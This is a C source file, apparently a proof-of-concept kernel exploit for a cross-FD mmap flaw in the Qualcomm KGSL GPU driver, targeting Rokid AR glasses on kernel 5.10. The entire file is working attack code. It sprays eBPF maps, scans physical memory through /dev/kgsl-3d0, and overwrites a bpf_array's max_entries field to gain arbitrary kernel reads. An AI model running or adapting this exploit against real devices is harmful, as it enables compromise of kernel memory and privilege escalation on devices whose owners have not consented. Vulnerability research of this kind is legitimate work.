/*
 * crossfd_physical_scan.c - CVE-2025-21479 Physical Memory Scanner
 *
 * Strategy:
 * Since GPU context creation is blocked, we use the Cross-FD mmap bug
 * (CVE-2025-21479) to scan physical memory directly.
 *
 * The vulnerability allows mmap with offset parameter interpreted as
 * physical page, bypassing GPU address translation.
 *
 * Phase 1: Spray eBPF maps with unique markers
 * Phase 2: Scan physical pages via Cross-FD mmap
 * Phase 3: Find bpf_array structures by signature
 * Phase 4: Corrupt max_entries for OOB access
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/bpf.h>

/* KGSL Definitions */
struct kgsl_gpuobj_alloc
{
    uint64_t size;
    uint64_t flags;
    uint64_t va_len;
    uint64_t mmapaddr;
    uint64_t id;
    uint64_t metadata_len;
    uint64_t metadata;
};

#define KGSL_IOC_TYPE 0x09
#define IOCTL_KGSL_GPUOBJ_ALLOC \
    _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

/* BPF Map Configuration */
#define SPRAY_COUNT 2048
#define VALUE_SIZE 200 // Target kmalloc-256
#define MARKER_BASE 0xDEAD0000BEEF0000ULL

/* bpf_array structure layout (kernel 5.10):
 *
 * struct bpf_array {
 *     struct bpf_map map;          // Offset 0x00, ~200 bytes
 *     u32 elem_size;               // Offset ~0xC8
 *     u32 index_mask;              // ~0xCC (power-of-2 - 1)
 *     union {
 *         char value[0];           // Element storage
 *         ...
 *     };
 * }
 *
 * struct bpf_map {
 *     const struct bpf_map_ops *ops;   // 0x00
 *     ...
 *     u32 key_size;                    // ~0x04
 *     u32 value_size;                  // ~0x08
 *     u32 max_entries;                 // ~0x0C  <-- TARGET!
 *     ...
 *     char name[BPF_OBJ_NAME_LEN];     // ~0x60
 * }
 */

/* Signature patterns for finding bpf_array in memory */
#define BPF_MAP_KEY_SIZE_OFFSET 0x04
#define BPF_MAP_VALUE_SIZE_OFFSET 0x08
#define BPF_MAP_MAX_ENTRIES_OFFSET 0x0C

/* Our expected values */
#define EXPECTED_KEY_SIZE 4
#define EXPECTED_VALUE_SIZE 200
#define EXPECTED_MAX_ENTRIES 1

/* BPF syscall wrapper */
static inline int bpf_syscall(int cmd, union bpf_attr *attr, unsigned int size)
{
    return syscall(__NR_bpf, cmd, attr, size);
}

/* Spray state */
static int spray_fds[SPRAY_COUNT];
static int maps_created = 0;

/* ========================================
 * Phase 1: eBPF Map Spray
 * ========================================
 */
int phase1_spray(void)
{
    printf("\n=== Phase 1: eBPF Map Spray ===\n");

    for (int i = 0; i < SPRAY_COUNT; i++)
    {
        union bpf_attr attr = {
            .map_type = BPF_MAP_TYPE_ARRAY,
            .key_size = EXPECTED_KEY_SIZE,
            .value_size = EXPECTED_VALUE_SIZE,
            .max_entries = EXPECTED_MAX_ENTRIES,
            .map_flags = 0,
        };

        spray_fds[i] = bpf_syscall(BPF_MAP_CREATE, &attr, sizeof(attr));

        if (spray_fds[i] < 0)
        {
            if (maps_created == 0)
            {
                printf("[-] BPF not available: %s\n", strerror(errno));
                return -1;
            }
            continue;
        }

        /* Write marker */
        uint32_t key = 0;
        uint64_t value[VALUE_SIZE / sizeof(uint64_t)];
        memset(value, 0, sizeof(value));
        value[0] = MARKER_BASE | i;

        union bpf_attr update = {
            .map_fd = spray_fds[i],
            .key = (uint64_t)&key,
            .value = (uint64_t)value,
            .flags = BPF_ANY,
        };
        bpf_syscall(BPF_MAP_UPDATE_ELEM, &update, sizeof(update));

        maps_created++;
    }

    printf("[+] Created %d BPF maps\n", maps_created);
    return maps_created;
}

/* ========================================
 * Phase 2: Cross-FD Physical Memory Scan
 * ========================================
 */
struct found_bpf_map
{
    uint64_t phys_page;
    uint64_t page_offset;
    uint32_t max_entries;
    int map_index;
};

#define MAX_FOUND 100
static struct found_bpf_map found_maps[MAX_FOUND];
static int num_found = 0;

/* Check if a memory region looks like a bpf_array */
int check_bpf_signature(uint8_t *mem, size_t offset, struct found_bpf_map *result)
{
    if (offset + 0x20 > 0x1000)
        return 0;

    uint32_t *ptr = (uint32_t *)(mem + offset);

    /* Check expected field values at typical offsets */
    /* bpf_map structure starts at various alignments, try multiple */

    for (int align = 0; align < 32; align += 8)
    {
        if (offset + align + 0x10 > 0x1000)
            break;

        uint32_t *check = (uint32_t *)(mem + offset + align);

        /* Look for our characteristic pattern:
         * key_size = 4, value_size = 200, max_entries = 1
         */
        if (check[0] == EXPECTED_KEY_SIZE &&
            check[1] == EXPECTED_VALUE_SIZE &&
            check[2] == EXPECTED_MAX_ENTRIES)
        {

            result->page_offset = offset + align;
            result->max_entries = check[2];
            return 1;
        }

        /* Also check reversed order in case struct layout differs */
        if (check[0] == EXPECTED_MAX_ENTRIES &&
            check[1] == EXPECTED_VALUE_SIZE &&
            check[2] == EXPECTED_KEY_SIZE)
        {

            result->page_offset = offset + align;
            result->max_entries = check[0];
            return 2;
        }
    }

    return 0;
}

/* Check for our marker in the data */
int check_marker(uint8_t *mem, int *map_index)
{
    uint64_t *ptr = (uint64_t *)mem;

    for (int i = 0; i < 512; i++)
    {
        if ((ptr[i] & 0xFFFF0000FFFF0000ULL) == MARKER_BASE)
        {
            *map_index = ptr[i] & 0xFFFF;
            return 1;
        }
    }
    return 0;
}

void phase2_scan(void)
{
    printf("\n=== Phase 2: Cross-FD Physical Memory Scan ===\n");

    int kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
    {
        printf("[-] Cannot open KGSL\n");
        return;
    }

    /* Open second FD for Cross-FD */
    int kgsl_fd2 = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd2 < 0)
    {
        printf("[-] Cannot open second KGSL fd\n");
        close(kgsl_fd);
        return;
    }

    /* Physical memory ranges to scan */
    /* Kernel heap is typically in lower physical memory */
    uint64_t scan_ranges[][2] = {
        {0x80000000ULL, 0x88000000ULL},   // 128MB - common kernel range
        {0x40000000ULL, 0x48000000ULL},   // Another common range
        {0x00001000ULL, 0x00100000ULL},   // Low memory
        {0x100000000ULL, 0x108000000ULL}, // High memory (>4GB)
    };

    printf("[*] Scanning physical memory for BPF structures...\n");
    printf("    (This may take a while)\n\n");

    int pages_scanned = 0;
    int pages_mapped = 0;
    int pages_failed = 0;

    for (int r = 0; r < 4 && num_found < MAX_FOUND; r++)
    {
        uint64_t start = scan_ranges[r][0];
        uint64_t end = scan_ranges[r][1];

        printf("[*] Range %d: 0x%llx - 0x%llx\n", r,
               (unsigned long long)start, (unsigned long long)end);

        for (uint64_t phys = start; phys < end && num_found < MAX_FOUND; phys += 0x1000)
        {
            pages_scanned++;

            /* Try Cross-FD mmap with physical address as offset */
            void *mem = mmap(NULL, 0x1000, PROT_READ,
                             MAP_SHARED, kgsl_fd2, phys);

            if (mem == MAP_FAILED)
            {
                pages_failed++;
                continue;
            }

            pages_mapped++;

            /* Check for marker */
            int map_idx;
            if (check_marker((uint8_t *)mem, &map_idx))
            {
                printf("[!] Found marker at phys 0x%llx (map %d)\n",
                       (unsigned long long)phys, map_idx);

                /* Try to find bpf_array signature nearby */
                struct found_bpf_map result = {
                    .phys_page = phys,
                    .map_index = map_idx,
                };

                for (int off = 0; off < 0x1000; off += 8)
                {
                    if (check_bpf_signature((uint8_t *)mem, off, &result))
                    {
                        found_maps[num_found++] = result;
                        printf("    BPF sig at offset 0x%llx, max_entries=%u\n",
                               (unsigned long long)result.page_offset,
                               result.max_entries);
                        break;
                    }
                }
            }

            munmap(mem, 0x1000);

            /* Progress */
            if (pages_scanned % 10000 == 0)
            {
                printf("    Scanned %d pages, mapped %d, found %d structures\n",
                       pages_scanned, pages_mapped, num_found);
            }
        }
    }

    printf("\n[*] Scan complete:\n");
    printf("    Pages scanned: %d\n", pages_scanned);
    printf("    Pages mapped:  %d\n", pages_mapped);
    printf("    Pages failed:  %d\n", pages_failed);
    printf("    BPF maps found: %d\n", num_found);

    close(kgsl_fd2);
    close(kgsl_fd);
}

/* ========================================
 * Phase 3: Corruption Attempt
 * ========================================
 */
void phase3_corrupt(void)
{
    if (num_found == 0)
    {
        printf("\n=== Phase 3: Skipped (no targets found) ===\n");
        return;
    }

    printf("\n=== Phase 3: Corruption Attempt ===\n");

    int kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
        return;

    for (int i = 0; i < num_found; i++)
    {
        struct found_bpf_map *target = &found_maps[i];

        printf("[*] Attempting to corrupt map %d at phys 0x%llx + 0x%llx\n",
               target->map_index,
               (unsigned long long)target->phys_page,
               (unsigned long long)target->page_offset);

        /* Map with write permission */
        void *mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                         MAP_SHARED, kgsl_fd, target->phys_page);

        if (mem == MAP_FAILED)
        {
            printf("    [-] Write mmap failed: %s\n", strerror(errno));
            continue;
        }

        /* Corrupt max_entries */
        uint32_t *max_entries = (uint32_t *)((uint8_t *)mem +
                                             target->page_offset +
                                             BPF_MAP_MAX_ENTRIES_OFFSET);

        printf("    Current max_entries: %u\n", *max_entries);

        *max_entries = 0xFFFFFFFF; // Maximum possible
        __sync_synchronize();

        printf("    Corrupted to: %u\n", *max_entries);

        munmap(mem, 0x1000);

        /* Verify via BPF */
        uint32_t key = 100; // Out of original bounds
        uint64_t value[VALUE_SIZE / sizeof(uint64_t)];

        union bpf_attr lookup = {
            .map_fd = spray_fds[target->map_index],
            .key = (uint64_t)&key,
            .value = (uint64_t)value,
        };

        if (bpf_syscall(BPF_MAP_LOOKUP_ELEM, &lookup, sizeof(lookup)) == 0)
        {
            printf("    [+] OOB READ SUCCESS! Arbitrary kernel read achieved!\n");
            printf("    Value[0] = 0x%016llx\n", (unsigned long long)value[0]);
        }
        else
        {
            printf("    [-] OOB read failed: %s\n", strerror(errno));
        }
    }

    close(kgsl_fd);
}

/* ========================================
 * Alternative: Direct Page Probe
 * ========================================
 */
void direct_page_probe(void)
{
    printf("\n=== Alternative: Direct Cross-FD Page Probe ===\n");

    int kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0)
    {
        printf("[-] Cannot open KGSL\n");
        return;
    }

    /* First allocate a small GPU buffer */
    struct kgsl_gpuobj_alloc alloc = {
        .size = 0x10000,
        .flags = 0x00100000,
    };

    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) < 0)
    {
        printf("[-] GPU alloc failed: %s\n", strerror(errno));
        close(kgsl_fd);
        return;
    }

    printf("[+] GPU buffer allocated, mmapaddr=0x%llx, id=%llu\n",
           (unsigned long long)alloc.mmapaddr,
           (unsigned long long)alloc.id);

    /* Open second FD */
    int kgsl_fd2 = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd2 < 0)
    {
        close(kgsl_fd);
        return;
    }

    printf("[*] Testing Cross-FD mmap at various offsets...\n\n");

    /* Try some interesting offsets */
    uint64_t test_offsets[] = {
        0x0,
        0x1000,
        0x2000,
        0x10000,
        0x100000,
        alloc.mmapaddr,
        alloc.mmapaddr + 0x1000,
        0x80000000ULL, // Common kernel phys base
        0x40000000ULL, // Another base
    };

    for (int i = 0; i < sizeof(test_offsets) / sizeof(test_offsets[0]); i++)
    {
        uint64_t off = test_offsets[i];

        void *mem = mmap(NULL, 0x1000, PROT_READ,
                         MAP_SHARED, kgsl_fd2, off);

        if (mem == MAP_FAILED)
        {
            printf("  Offset 0x%012llx: FAILED (%s)\n",
                   (unsigned long long)off, strerror(errno));
        }
        else
        {
            /* Read first few bytes */
            uint64_t *ptr = (uint64_t *)mem;
            printf("  Offset 0x%012llx: SUCCESS - Data: 0x%016llx 0x%016llx\n",
                   (unsigned long long)off,
                   (unsigned long long)ptr[0],
                   (unsigned long long)ptr[1]);
            munmap(mem, 0x1000);
        }
    }

    close(kgsl_fd2);
    close(kgsl_fd);
}

/* ========================================
 * Main
 * ========================================
 */
int main(int argc, char **argv)
{
    printf("=== CVE-2025-21479 Physical Memory Scanner ===\n");
    printf("Target: Rokid AR Glasses (Kernel 5.10.209)\n");
    printf("Goal: Find and corrupt bpf_array.max_entries\n\n");

    /* Phase 1: Spray */
    if (phase1_spray() <= 0)
    {
        printf("[-] Spray failed\n");
        return 1;
    }

    /* Test direct page probe first */
    direct_page_probe();

    /* Phase 2: Scan (if requested) */
    if (argc > 1 && strcmp(argv[1], "-s") == 0)
    {
        phase2_scan();
    }
    else
    {
        printf("\n[*] Use -s flag to perform full physical memory scan\n");
    }

    /* Phase 3: Corrupt */
    phase3_corrupt();

    /* Keep maps alive for further testing */
    if (argc > 1 && strcmp(argv[1], "-k") == 0)
    {
        printf("\n[*] Keeping maps alive. Press Enter to cleanup...\n");
        getchar();
    }

    /* Cleanup */
    for (int i = 0; i < SPRAY_COUNT; i++)
    {
        if (spray_fds[i] >= 0)
            close(spray_fds[i]);
    }

    printf("\n=== Done ===\n");
    return 0;
}
